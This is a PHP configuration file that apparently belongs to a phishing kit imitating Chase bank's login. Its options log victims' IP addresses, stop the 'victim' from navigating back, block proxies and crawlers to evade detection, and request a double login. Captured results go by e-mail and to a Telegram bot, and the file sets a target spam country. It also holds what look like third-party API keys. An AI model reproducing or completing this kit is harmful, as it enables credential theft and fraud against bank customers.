<?php



$settings = array(
	"log_user"		=> "1",	// Log User-Agent, IP and Date
	"phone_lookup"	=> "1",	// Phone API Lookup
	"zip_lookup"	=> "1", // ZIP Lookup
	"print_match"	=> "0",	// Print Crawler Detections 
	"anti-back"		=> "1",	// Victim Can't Go Back To Session
	"debug"			=> "0",	// Print Errors
	"proxy_block"	=> "1",	// Detect Proxies & Block Them
	"send_mail"		=> "1",	// Send E-Mail To Your Mail
	"save_results"	=> "1",	// Save Results 
	"telegram"		=> "1",	// Telegram Bots Receiver
	"double_login"	=> "1", // Double Login
	"country"		=> "US", // Target SPAM Country
	"background"	=> "day", // "day" or "night" to customize chase
	"chat_id"		=> "",	// Chat ID Of You
	"bot_url"		=> "",	// Your Bot API Key (ADD "bot" BEFORE API KEY)
	"api_key"		=> "901bfbca1baf949ed4b126660fb995af",	// API Key Numerify.com
	"zip_api"		=> "36e01f60-c6f2-11eb-8340-31ed2fafdc23", // API Key zipcodebase.com
	"referer"		=> "https://live.com/",	// HTTP Referer For Antibots 
	"out"			=> "chase+login",	// Outcome Of AntiBots Forward - DONT CHANGE
	"email"			=> "your@gmail.com",	// Your E-Mail
);
return $settings;



?>